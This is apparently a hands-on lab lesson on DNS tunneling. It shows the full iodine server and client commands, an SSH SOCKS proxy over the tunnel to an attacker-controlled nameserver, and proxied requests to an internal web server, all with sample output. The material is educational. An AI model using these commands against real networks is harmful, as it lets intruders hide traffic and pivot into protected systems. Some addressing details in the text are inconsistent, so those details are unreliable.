# DNS Tunneling

This task demonstrates how to create a tunnel through the DNS protocol. Ensure you understand the concept discussed in the previous task (Exfiltration over DNS), as DNS tunneling tools work based on the same technique.

## DNS Tunneling (TCP over DNS)

This technique, also known as TCP over DNS, allows an attacker to encapsulate other protocols, such as HTTP requests, over the DNS protocol using the DNS Data Exfiltration technique. DNS tunneling establishes a communication channel where data is sent and received continuously.

### DNS Tunneling - Data Flow

This section explains the steps required to establish a communication channel over DNS. The technique will be applied to the provided network infrastructure (JumpBox and Victim2) to pivot from Network 2 (`192.168.0.0/24`) to Network 1 (`172.20.0.0/24`) and access the internal web server. For more information about the network infrastructure, refer to Task 2.

We will use the `iodine` tool to create DNS tunneling communications. Note that `iodine` is already installed on the JumpBox and Attacker machines. Follow these steps to establish DNS tunneling:

1. Update the DNS records and create new NS points to your AttackBox machine (refer to Task 8), or use the preconfigured nameserver pointing to the Attacker machine (`att.tunnel.com=172.20.0.200`).
2. Run the `iodined` server from the AttackBox or Attacker machine.
3. On JumpBox, run the `iodine` client to establish the connection.
4. SSH to the machine on the created network interface to create a proxy over DNS using the `-D` argument for dynamic port forwarding.
5. Once the SSH connection is established, use the local IP and port as a proxy in Firefox or ProxyChains.

### Running the `iodined` Server

Run the server-side application (`iodined`) as follows:

```bash
thm@attacker$ sudo iodined -f -c -P thmpass 10.1.1.1/24 att.tunnel.com
Opened dns0
Setting IP of dns0 to 10.1.1.1
Setting MTU of dns0 to 1130
Opened IPv4 UDP socket
Listening to dns for domain att.tunnel.com
```

#### Explanation of the Command:
- **`sudo`**: Required to create a new network interface (`dns0`) for tunneling over DNS.
- **`-f`**: Runs the server in the foreground.
- **`-c`**: Skips checking the client IP address and port for each DNS request.
- **`-P`**: Sets a password for authentication.
- **`10.1.1.1/24`**: Sets the network IP for the new network interface (`dns0`). The server's IP will be `10.1.1.1`, and the client's IP will be `10.1.1.2`.
- **`att.tunnel.com`**: The nameserver previously configured.

### Victim Connects to the Server

On the JumpBox machine, connect to the server-side application:

```bash
thm@jump-box:~$ sudo iodine -P thmpass att.tunnel.com
Opened dns0
Opened IPv4 UDP socket
Sending DNS queries for att.tunnel.com to 127.0.0.11
Autodetecting DNS query type (use -T to override).
Using DNS type NULL queries
Version ok, both using protocol v 0x00000502. You are user #0
Setting IP of dns0 to 10.1.1.2
Setting MTU of dns0 to 1130
Server tunnel IP is 10.1.1.1
Testing raw UDP data to the server (skip with -r)
Server is at 172.20.0.200, trying raw login: OK
Sending raw traffic directly to 172.20.0.200
Connection setup complete, transmitting data.
```

#### Notes:
- The client-side tool (`iodine`) is executed with the `-P` argument for authentication.
- Once the connection is established, open a new terminal and log in to `10.1.1.1` via SSH.

### SSH Over DNS

Use the following command to establish an SSH connection over DNS:

```bash
root@attacker$ ssh thm@10.1.1.2 -4 -f -N -D 1080
```

#### Explanation of the Command:
- **`-D 1080`**: Enables dynamic port forwarding on port 1080.
- **`-f`**: Forces SSH to run in the background.
- **`-4`**: Forces the SSH client to bind to IPv4 only.

### Use SSH Connection as a Proxy

Now that the connection to JumpBox over the `dns0` network is established, use ProxyChains or Firefox with `127.0.0.1` and port `1080` as proxy settings:

```bash
root@attacker$ proxychains curl http://192.168.0.100/demo.php
root@attacker$ # OR
root@attacker$ curl --socks5 127.0.0.1:1080 http://192.168.0.100/demo.php
```

### Capturing DNS Traffic

Confirm that all traffic goes through the DNS protocol by checking the `tcpdump` on the Attacker machine through the `eth0` interface.

#### Task:
Apply the DNS tunneling technique in the provided network environment and access `http://192.168.0.100/test.php` to answer the question below.